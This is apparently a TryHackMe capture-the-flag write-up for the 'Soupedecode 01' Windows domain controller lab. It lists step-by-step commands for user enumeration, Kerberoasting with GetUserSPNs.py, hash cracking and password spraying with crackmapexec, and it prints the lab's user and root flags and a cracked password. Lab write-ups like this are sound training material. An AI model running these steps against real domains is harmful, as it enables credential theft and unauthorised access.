# Soupedecode 01 — TryHackMe Writeup

## Machine Info

| Parameter  | Value               |
| ---------- | ------------------- |
| Machine    | Soupedecode 01       |
| Difficulty | Easy                 |
| OS         | Windows Server       |
| Type       | Active Directory     |
| Hostname   | DC01                 |
| Domain     | SOUPEDECODE.LOCAL    |

---

## 1. Reconnaissance

```bash
nmap -sC -sV -Pn <IP>
```

**Result:**

```
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
```

This combination of open ports indicates the target is a domain controller:

| Port | Service | Purpose |
|------|---------|---------|
| 88/tcp | kerberos-sec | User authentication |
| 389/tcp | ldap | Stores users, groups, computers, policies |
| 445/tcp | microsoft-ds | File access, remote access, permission checks |
| 3268/tcp | globalcatLDAP | Object lookup across the forest (Global Catalog) |

---

## 2. Domain Identification

Grab the domain name:

```bash
nxc smb <IP>
```

**Result:**

```
Domain: SOUPEDECODE
Computer: DC01
FQDN: DC01.SOUPEDECODE.LOCAL
```

Add the domain to `/etc/hosts`:

```bash
echo "<IP> <DomainName>" | sudo tee -a /etc/hosts
```

> **Note:** Kerberos relies on domain/hostnames rather than raw IPs — working by IP alone may fail.

---

## 3. Domain User Enumeration

Kerberos user enumeration (run from inside the `kerbrute` folder):

```bash
sudo kerbrute userenum \
  --dc <IP> \
  -d SOUPEDECODE.LOCAL \
  users.txt
```

**User found:**

```
ybob317@SOUPEDECODE.LOCAL
```

**Screenshot 1** — kerbrute userenum result

> **Note:** finding a valid username ≠ having a password.

---

## 4. Active Directory Enumeration

Goal of this stage:
- enumerate users;
- enumerate groups;
- enumerate SIDs;
- collect SMB information.

```bash
enum4linux -u soupedecode.local\\ybob317 -p ybob317 -a <IP>
```

`enum4linux` revealed an accessible SMB share.

---

## 5. Initial Access

Connect to the share using the discovered account:

```bash
smbclient \\\\<IP>\\Users -U SOUPEDECODE.LOCAL\\ybob317
```

User flag found:

```
cd ybob317\Desktop
more user.txt
```

**User flag:**

```
28189316c25dd3c0ad56d44d000d62a8
```

---

## 6. Kerberoasting

Hunt for service accounts (SPNs) and request TGS tickets:

```bash
GetUserSPNs.py -request soupedecode.local/ybob317 \
  -dc-ip <IP> \
  -outputfile Roasted.txt
```

**Flag breakdown:**

| Flag | Purpose |
|------|---------|
| `GetUserSPNs.py` | Finds AD accounts with an SPN and performs Kerberoasting |
| `-request` | Requests a Kerberos TGS ticket (triggers kerberoasting) |
| `soupedecode.local/ybob317` | Domain/user credentials |
| `-dc-ip <IP>` | Domain controller IP address |

Obtained a Kerberos TGS ticket hash (`$krb5tgs$...`).

**Screenshot 2** — cracking the hash with John/Hashcat

Cracking the hash with John/Hashcat gave:

```
Password123!!
```

---

## 7. Identifying the Password Owner

Since the hash didn't directly indicate which account the password belonged to, all discovered SPN accounts were sprayed:

```bash
crackmapexec smb <IP> \
  -u users.txt \
  -p 'Password123!!' \
  -d SOUPEDECODE.LOCAL
```

**Screenshot 3** — crackmapexec result confirming the `file_svc` account

The password matched the `file_svc` account, which has access to a `more_backup` share.

---

## 8. Backup Access and Root Flag

Connecting as `file_svc` granted access to the Administrator's files.

**Screenshot 4** — accessing the backup share as `file_svc`

The flag is located at `Administrator\Desktop\root.txt`.

**Root flag:**

```
27cb2be302c388d63d27c86bfdd5f56a
```

---

## Takeaways

- Active Directory has a lot of moving parts — a demanding but rewarding first attempt.
- Knowing standard ports and the services behind them significantly speeds up recon.
- Worth getting familiar with enum4linux, kerbrute, Impacket (`GetUserSPNs.py`), and crackmapexec/nxc ahead of time.
- Using `\` to break long commands across lines in the terminal makes them much more readable.

---

### Attack Chain (summary)

```
Nmap → identify AD/DC
  → nxc smb → domain name
    → kerbrute userenum → valid user (ybob317)
      → enum4linux/smbclient → user.txt (user flag)
        → GetUserSPNs.py → Kerberoasting → TGS hash
          → John/Hashcat → password Password123!!
            → crackmapexec → file_svc account
              → access to Administrator's backup → root.txt (root flag)
```
